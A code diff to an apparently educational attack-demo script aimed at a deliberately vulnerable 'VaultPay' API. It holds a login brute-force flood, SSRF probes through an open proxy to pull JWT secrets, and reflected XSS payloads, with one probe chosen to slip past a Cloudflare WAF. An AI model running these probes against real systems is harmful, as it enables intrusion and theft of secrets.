@@ -115,8 +115,13 @@ ${c.red}${c.bold}╔════════════════════
   console.log(
     `${c.bold}Flags${c.reset}    wire=${showWire ? "on" : "off"}  verbose=${verbose ? "on" : "off"}  drama=${drama ? "on" : "off"}  flood=${skipFlood ? "off" : "on"}  slow=${skipSlow ? "off" : "on"}`
   );
+  if (process.env.NODE_TLS_REJECT_UNAUTHORIZED === "0") {
+    console.log(
+      `${c.yellow}${c.bold}TLS${c.reset}     NODE_TLS_REJECT_UNAUTHORIZED=0 (corporate MITM / Zscaler — demo laptop only)`
+    );
+  }
   console.log(
-    `${c.dim}Legend   ${c.cyan}→ SEND${c.reset}${c.dim} request   ${c.green}← RECV${c.reset}${c.dim} response   ${c.bgRed}${c.white} LOOT ${c.reset}${c.dim} stolen data   ${c.red}[CRITICAL]${c.reset}${c.dim} finding${c.reset}\n`
+    `${c.dim}Legend   ${c.cyan}→ SEND${c.reset}${c.dim}  ${c.green}← RECV${c.reset}${c.dim}  ${c.bgRed}${c.white} LOOT ${c.reset}${c.dim}  ${c.red}✗ APP HOLE${c.reset}${c.dim}  ${c.yellow}◇ PLATFORM${c.reset}${c.dim}  ${c.green}✓ OK${c.reset}${c.dim}  ${c.red}[CRITICAL]${c.reset}${c.dim} finding${c.reset}\n`
   );
 }
 
@@ -142,11 +147,18 @@ function narrate(msg) {
 }
 
 function ok(msg) {
-  console.log(`  ${c.green}✓ DEFENDED / OK${c.reset}  ${msg}`);
+  // Expected behavior or probe did not fire — NOT "the app is secure".
+  console.log(`  ${c.green}✓ OK${c.reset}             ${msg}`);
 }
 
 function bad(msg) {
-  console.log(`  ${c.red}✗ VULNERABLE${c.reset}     ${msg}`);
+  // Application-layer hole the audience should fear.
+  console.log(`  ${c.red}✗ APP HOLE${c.reset}       ${msg}`);
+}
+
+function platform(msg) {
+  // Edge / CDN / Worker runtime blocked the probe — not app authz.
+  console.log(`  ${c.yellow}◇ PLATFORM${c.reset}       ${msg}`);
 }
 
 function info(msg) {
@@ -384,13 +396,20 @@ const stolen = {
   forgedAdminToken: null,
   escalated: false,
   findings: [],
+  platformNotes: [],
 };
 
-function record(severity, title, detail) {
-  stolen.findings.push({ severity, title, detail });
+function record(severity, title, detail, source = "app") {
+  stolen.findings.push({ severity, title, detail, source });
   finding(severity, title);
   if (detail) info(detail);
   scoreboard();
+}
+
+function notePlatform(title, detail) {
+  stolen.platformNotes.push({ title, detail });
+  platform(title);
+  if (detail) info(detail);
 }
 
 // ---------------------------------------------------------------------------
@@ -493,6 +512,7 @@ async function phaseNoRateLimitFlood() {
     return;
   }
   const N = 40;
+  const idBefore = reqSeq;
   narrate(`Firing ${N} parallel POST /api/auth/login with wrong passwords…`);
   const t0 = Date.now();
   const results = await Promise.all(
@@ -513,12 +533,13 @@ async function phaseNoRateLimitFlood() {
   }, {});
   const got429 = statuses.filter((s) => s === 429).length;
   const got401 = statuses.filter((s) => s === 401).length;
+  const idAfter = reqSeq;
 
   console.log(
-    `  ${c.cyan}${c.bold}→ SEND${c.reset}  ${c.bold}#flood${c.reset}  ${N}× parallel POST /api/auth/login  ${c.dim}(wire logs collapsed)${c.reset}`
+    `  ${c.cyan}${c.bold}→ SEND${c.reset}  ${c.bold}#${idBefore + 1}–#${idAfter}${c.reset}  ${N}× parallel POST /api/auth/login  ${c.dim}(wire logs collapsed)${c.reset}`
   );
   console.log(
-    `  ${c.green}${c.bold}← RECV${c.reset}  ${c.bold}#flood${c.reset}  finished in ${c.bold}${ms}ms${c.reset}  histogram=${JSON.stringify(counted)}`
+    `  ${c.green}${c.bold}← RECV${c.reset}  flood batch  finished in ${c.bold}${ms}ms${c.reset}  histogram=${JSON.stringify(counted)}`
   );
 
   if (got429 === 0 && got401 >= N * 0.7) {
@@ -610,10 +631,10 @@ async function phaseSsrfProxy() {
   narrate(`Asking the server to fetch its own debug config: ${loop}`);
   const res = await http("GET", `/api/proxy?url=${encodeURIComponent(loop)}`, {
     timeoutMs: 12_000,
-    label: "ssrf-loopback",
+    label: "ssrf-self",
   });
   if (res.status === 200 && /jwtSecret|supersecret/i.test(res.text)) {
-    bad("Open proxy reached loopback and returned secrets");
+    bad("Open proxy fetched own debug config and returned secrets");
     loot("ssrf-body", res.text.slice(0, 240));
     try {
       const j = JSON.parse(res.text);
@@ -630,10 +651,52 @@ async function phaseSsrfProxy() {
       "fetchGuard would block loopback / metadata targets"
     );
   } else if (res.status === 200) {
-    bad(`Open proxy returned 200 for ${loop}`);
+    bad(`Open proxy returned 200 for self-URL (body may vary)`);
     record("HIGH", "Open proxy endpoint exists", res.text.slice(0, 120));
+  } else if (
+    res.status === 404 &&
+    /error code:\s*1042/i.test(res.text || "")
+  ) {
+    notePlatform(
+      "Self-fetch blocked by Cloudflare (error 1042) — not app authz",
+      "Workers often refuse same-origin/self subrequests. The /api/proxy hole may still work for other URLs."
+    );
+    // Prove the open proxy is still real with a harmless external target.
+    const external = "https://example.com/";
+    narrate(`Fallback: open-proxy fetch of ${external}…`);
+    const ext = await http("GET", `/api/proxy?url=${encodeURIComponent(external)}`, {
+      timeoutMs: 12_000,
+      label: "ssrf-external",
+    });
+    if (ext.status === 200 && /example|domain|illustrative/i.test(ext.text)) {
+      bad("Server-side open proxy fetched an arbitrary external URL");
+      loot("proxy-snippet", ext.text.replace(/\s+/g, " ").trim().slice(0, 120));
+      record(
+        "HIGH",
+        "Open proxy: server fetches arbitrary URLs (SSRF surface)",
+        "Self-target blocked by CF 1042; external target succeeded — app still has no fetchGuard"
+      );
+    } else {
+      info(`External proxy probe → ${ext.status} (self still CF-blocked)`);
+    }
   } else {
-    info(`Proxy probe → ${res.status}`);
+    info(`Self-proxy probe → ${res.status}`);
+    const external = "https://example.com/";
+    narrate(`Fallback: open-proxy fetch of ${external}…`);
+    const ext = await http("GET", `/api/proxy?url=${encodeURIComponent(external)}`, {
+      timeoutMs: 12_000,
+      label: "ssrf-external",
+    });
+    if (ext.status === 200 && ext.text.length > 20) {
+      bad("Server-side open proxy fetched an arbitrary external URL");
+      record(
+        "HIGH",
+        "Open proxy: server fetches arbitrary URLs (SSRF surface)",
+        "No allowlist / fetchGuard on /api/proxy"
+      );
+    } else {
+      info(`External proxy probe → ${ext.status}`);
+    }
   }
   await dramaPause();
 }
@@ -655,25 +718,50 @@ async function phaseStackAndEcho() {
     ok(`No stack in boom response (${boom.status})`);
   }
 
-  const xss = `<img src=x onerror=alert(1)>`;
-  narrate("Reflecting an XSS payload through /api/echo as text/html…");
-  const echo = await http("GET", `/api/echo?msg=${encodeURIComponent(xss)}`, {
-    label: "xss-echo",
+  // Mild reflection first (less likely to trip edge WAF than onerror=alert).
+  const mild = "<b>vaultpay-reflected</b>";
+  narrate("Reflecting mild HTML through /api/echo (text/html)…");
+  const mildRes = await http("GET", `/api/echo?msg=${encodeURIComponent(mild)}`, {
+    label: "html-echo-mild",
   });
   if (
-    echo.status === 200 &&
-    echo.text.includes(xss) &&
-    /text\/html/i.test(echo.headers["content-type"] || "")
+    mildRes.status === 200 &&
+    mildRes.text.includes(mild) &&
+    /text\/html/i.test(mildRes.headers["content-type"] || "")
   ) {
-    bad("Payload reflected in HTML response (XSS sink)");
-    loot("reflected", xss);
+    bad("User input reflected as text/html without encoding (XSS sink class)");
+    loot("reflected", mild);
     record(
       "HIGH",
-      "Reflected XSS via HTML echo endpoint",
-      "No output encoding; content-type text/html"
+      "Reflected HTML echo sink (XSS class)",
+      "content-type text/html + unescaped query — WAF may block noisier payloads"
     );
   } else {
-    ok("Echo XSS probe did not reflect as HTML");
+    const xss = `<img src=x onerror=alert(1)>`;
+    narrate("Trying noisier XSS payload (may trip Cloudflare WAF)…");
+    const echo = await http("GET", `/api/echo?msg=${encodeURIComponent(xss)}`, {
+      label: "xss-echo-noisy",
+    });
+    if (
+      echo.status === 200 &&
+      echo.text.includes(xss) &&
+      /text\/html/i.test(echo.headers["content-type"] || "")
+    ) {
+      bad("Noisy XSS payload reflected as HTML");
+      loot("reflected", xss);
+      record(
+        "HIGH",
+        "Reflected XSS via HTML echo endpoint",
+        "No output encoding; content-type text/html"
+      );
+    } else if (echo.status === 403 || mildRes.status === 403) {
+      notePlatform(
+        "Edge WAF returned 403 on XSS/HTML probe — not Express output encoding",
+        "Cloudflare may block attack-shaped query strings. App still has /api/echo as text/html sink."
+      );
+    } else {
+      ok(`HTML echo probes did not prove reflection (mild=${mildRes.status} noisy=${echo.status})`);
+    }
   }
   await dramaPause();
 }
@@ -1044,14 +1132,22 @@ ${c.bold}${c.red}╔════════════════════
   );
 
   console.log(`\n  ${c.bold}What the junior developer believed:${c.reset}`);
-  console.log(`    ${c.green}"We use JWT. The API is secured."${c.reset}`);
+  console.log(`    ${c.green}"We use Express 5 + JWT. Deployed to Cloudflare. We're secured."${c.reset}`);
   console.log(`\n  ${c.bold}What the console just proved:${c.reset}`);
   console.log(
     `    ${c.red}Most damage needed no password. JWT only gated a few routes.` +
-      ` Authn ≠ authz. Defaults matter.${c.reset}`
+      ` Authn ≠ authz. Edge WAF ≠ API authorization. Defaults matter.${c.reset}`
   );
 
-  console.log(`\n  ${c.bold}All findings:${c.reset}`);
+  if (stolen.platformNotes.length) {
+    console.log(`\n  ${c.bold}${c.yellow}Platform notes (edge blocked probe — app may still be open):${c.reset}`);
+    for (const n of stolen.platformNotes) {
+      console.log(`    ${c.yellow}◇${c.reset} ${n.title}`);
+      if (n.detail) info(n.detail);
+    }
+  }
+
+  console.log(`\n  ${c.bold}App findings:${c.reset}`);
   for (const f of stolen.findings) {
     finding(f.severity, f.title);
     if (f.detail) info(f.detail);
@@ -1069,7 +1165,8 @@ ${c.bold}${c.red}╔════════════════════
     · prod problem+json redaction (no stack leaks)
     · auth hooks that fail closed — authn AND authz
 
-  ${c.dim}Only attack systems you own. Educational VaultPay demo only.${c.reset}
+  ${c.dim}See CLOUDFLARE-VS-APP-SECURITY.md for the edge-vs-app slide.
+  Only attack systems you own. Educational VaultPay demo only.${c.reset}
 `);
 
   if (asJson) {
@@ -1079,6 +1176,7 @@ ${c.bold}${c.red}╔════════════════════
           target: BASE,
           requests: reqSeq,
           findings: stolen.findings,
+          platformNotes: stolen.platformNotes,
           usersStolen: stolen.users.length,
           ordersStolen: stolen.orders.length,
           jwtSecret: Boolean(stolen.jwtSecret),
